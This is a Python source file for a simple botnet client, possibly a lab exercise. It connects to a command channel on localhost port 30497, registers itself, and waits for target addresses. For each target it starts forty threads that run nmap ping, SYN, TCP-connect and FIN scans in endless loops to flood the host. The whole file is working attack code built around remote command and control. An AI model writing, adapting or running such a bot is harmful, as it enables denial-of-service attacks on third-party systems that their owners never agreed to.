import socket
import sys
import nmap
import threading
from colorama import init, Fore, Back, Style	# for color and style
class Bot():
	"""docstring for Bot"""
	def __init__(self):
		self.chanel_ip = "127.0.0.1"
		self.chanel_port = 30497
	def bootstrap(self):
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			r = soc.connect((self.chanel_ip, self.chanel_port))
			soc.send("bot#connect".encode("utf8"))
			print(Style.BRIGHT, end='')
			print(Fore.CYAN + "*** Connected with chanel at %s:%d" % (self.chanel_ip, self.chanel_port))
			print(Fore.RESET, end='')
			while True:
				mess = soc.recv(1024)
				header, payload = mess.decode("utf8").split("#")
				if (header == "chn"):
					bot_attack = threading.Thread(target=self.attack, args=(payload,))
					bot_attack.start()
		except:
			return 'Connection faile'
	def attack(self, target):
		for i in range(0, 10):
			bot_attack = threading.Thread(target=self.PING_attack, args=(target,))
			bot_attack.start()
		for i in range(0, 10):
			bot_attack = threading.Thread(target=self.SYN_attack, args=(target,))
			bot_attack.start()
		for i in range(0, 10):
			bot_attack = threading.Thread(target=self.TCP_attack, args=(target,))
			bot_attack.start()
		for i in range(0, 10):
			bot_attack = threading.Thread(target=self.FIN_attack, args=(target,))
			bot_attack.start()
	def PING_attack(self, target):
		while True:
			print(Fore.RED + "!!! Attacking %s with Ping" % (target))
			print(Fore.RESET, end='')
			nm = nmap.PortScanner()
			nm.scan(hosts=str(target), arguments='-n -sP')
	def SYN_attack(self, target):
		while True:
			print(Fore.RED + "!!! Attacking %s with SYN Scan" % (target))
			print(Fore.RESET, end='')
			nm = nmap.PortScanner()
			nm.scan(hosts=str(target), arguments='-n -sS')
	def TCP_attack(self, target):
		while True:
			print(Fore.RED + "!!! Attacking %s with TCP Connection Scan" % (target))
			print(Fore.RESET, end='')
			nm = nmap.PortScanner()
			nm.scan(hosts=str(target), arguments='-n -sT')
	def FIN_attack(self, target):
		while True:
			print(Fore.RED + "!!! Attacking %s with FIN Scan" % (target))
			print(Fore.RESET, end='')
			nm = nmap.PortScanner()
			nm.scan(hosts=str(target), arguments='-n -sF')
if __name__ == '__main__':
	init() # for color
	bot = Bot()
	bot.bootstrap()